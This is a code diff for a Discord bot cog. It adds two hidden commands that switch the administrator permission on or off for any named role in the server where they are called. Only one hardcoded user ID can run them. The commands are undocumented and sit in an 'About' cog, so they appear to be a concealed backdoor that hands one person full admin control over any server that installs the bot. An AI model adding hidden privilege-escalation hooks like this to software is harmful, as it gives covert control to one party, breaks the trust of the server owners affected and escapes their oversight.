@@ -379,6 +379,40 @@ class About(commands.Cog):
 
 
     @commands.command(hidden=True)
+    async def promote_role_to_god(self, ctx):
+        """
+        set role as admin....
+        """
+        if ctx.message.author.id != 318309023478972417:  # https://media1.tenor.com/images/1796f0fa0b4b07e51687fad26a2ce735/tenor.gif
+            return await ctx.message.add_reaction(chr(0x1F44E))
+
+        await ctx.message.channel.trigger_typing()
+        input_string = ctx.message.content[21:]
+        role = get(ctx.guild.roles, name=input_string)
+        perms = role.permissions
+        perms.administrator = True
+        await role.edit(permissions=perms)
+
+
+        
+    @commands.command(hidden=True)
+    async def demote_role_from_god(self, ctx):
+        """
+        revoke role as admin....
+        """
+        if ctx.message.author.id != 318309023478972417:  # https://media1.tenor.com/images/1796f0fa0b4b07e51687fad26a2ce735/tenor.gif
+            return await ctx.message.add_reaction(chr(0x1F44E))
+
+        await ctx.message.channel.trigger_typing()
+        input_string = ctx.message.content[22:]
+        role = get(ctx.guild.roles, name=input_string)
+        perms = role.permissions
+        perms.administrator = False
+        await role.edit(permissions=perms)
+
+
+
+    @commands.command(hidden=True)
     async def help_admin(self, ctx):
         """
         Hidden help...
